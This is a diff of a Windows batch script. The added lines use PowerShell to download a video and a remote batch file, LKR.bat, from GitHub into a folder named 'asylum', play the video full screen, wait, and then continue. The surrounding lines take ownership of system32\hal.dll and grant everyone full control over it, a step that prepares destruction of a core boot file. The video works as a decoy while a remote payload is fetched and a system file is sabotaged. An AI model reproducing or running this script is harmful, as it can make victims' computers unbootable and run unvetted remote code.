@@ -28,7 +28,14 @@ md your
 cd your
 md asylum
 
-powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/LKR-beta/nope/raw/main/LKR.bat','C:\your\asylum\LKR.bat')"
+powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/Video_5982a2bd-c0c2-4402-ab83-a7a1e91510aa.mp4/nope/raw/main/Video_5982a2bd-c0c2-4402-ab83-a7a1e91510aa.mp4','C:\your\asylum\Video_5982a2bd-c0c2-4402-ab83-a7a1e91510aa.mp4')"
+powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/LKR.bat/nope/raw/main/LKR.bat','C:\your\asylum\LKR.bat')"
+
+start max Video_5982a2bd-c0c2-4402-ab83-a7a1e91510aa.mp4
+
+timeout /t 4
+
+start
 
 takeown /f "%systemdrive%\windows\system32\hal.dll"
 icacls "%systemdrive%\windows\system32\hal.dll" /grant everyone:f
